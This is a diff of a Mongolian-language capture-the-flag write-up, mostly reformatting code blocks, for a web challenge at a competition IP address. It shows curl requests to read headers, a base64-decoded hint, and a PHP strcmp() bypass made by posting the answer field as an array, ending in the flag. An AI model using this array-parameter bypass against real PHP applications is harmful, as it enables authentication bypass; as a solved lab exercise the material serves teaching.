@@ -8,9 +8,9 @@ draft: false
 
 ## Өгөгдөл
 
-**Даалгаврын нэр:** Толгой <br/>
-**Хандах хаяг:** http://103.48.116.193:8008/ <br/>
-**Оноо:** 40 оноо <br/>
+**Даалгаврын нэр:** Толгой  
+**Хандах хаяг:** http://103.48.116.193:8008/  
+**Оноо:** 40 оноо
 
 ---
 
@@ -18,8 +18,8 @@ draft: false
 
 Тэмцээний маргааш нь [curl](https://curl.haxx.se) ашиглаж header-үүдийг харж болохыг мэдсэн бөгөөд тугийг олж чадсан юм.
 
-```
-$ curl -I http://103.48.116.193:8008/
+```bash
+curl -I http://103.48.116.193:8008/
 ```
 
 > асуулт 1: Харуул Занги эхний тэмцээн болсон он? /хариултаа илээр явуулна уу. 'answer_level_one' /
@@ -28,34 +28,34 @@ $ curl -I http://103.48.116.193:8008/
 
 ---
 
-```
-$ curl -I http://103.48.116.193:8008/?answer_level_one=2013
+```bash
+curl -I http://103.48.116.193:8008/?answer_level_one=2013
 ```
 
 > Найдвар: aDRydVVMLVpAbkcxXzIwMTY= /хариултыг илээр явуулна уу. 'answer_next_one'/
 
 Өгөгдсөн [base64](https://en.wikipedia.org/wiki/Base64)-г тайлъя.
 
-```
-$ base64 -D <<< "aDRydVVMLVpAbkcxXzIwMTY="
+```bash
+base64 -D <<< "aDRydVVMLVpAbkcxXzIwMTY="
 ```
 
 `h4ruUL-Z@nG1_2016` гэсэн тэмдэгт мөр гарч ирлээ.
 
 ---
 
-```
-$ curl -I http://103.48.116.193:8008/?answer_next_one=h4ruUL-Z@nG1_2016
+```bash
+curl -I http://103.48.116.193:8008/?answer_next_one=h4ruUL-Z@nG1_2016
 ```
 
 > Учрыг ол : hint php strcmp() /хариултыг далдаар явуулна уу. 'answer_level_last_one'/
 
 [http://103.48.116.193:8008/?answer_next_one=h4ruUL-Z@nG1_2016](http://103.48.116.193:8008/?answer_next_one=h4ruUL-Z@nG1_2016) хаяг руу хандаж үзвэл input форм харагдана. Өгөгдсөн hint-г уншвал шалгалтаа strcmp() функц ашиглаж хийдэг бололтой. strcmp-г bypass хийхийн тулд тэмдэгт мөр хэлбэрээр хүсэлт явуулахад л болно.
 
-```
-$ curl -d "answer_level_last_one[]=a" http://103.48.116.193:8008/?answer_next_one=h4ruUL-Z@nG1_2016
+```bash
+curl -d "answer_level_last_one[]=a" http://103.48.116.193:8008/?answer_next_one=h4ruUL-Z@nG1_2016
 ```
 
 > FLAG: HZ{0nly_4rrAy_p4$$\_1t}
 
-Эцэст нь туг: **HZ{0nly_4rrAy_p4$$\_1t}**
+Эцэст нь туг: `HZ{0nly_4rrAy_p4$$\_1t}`
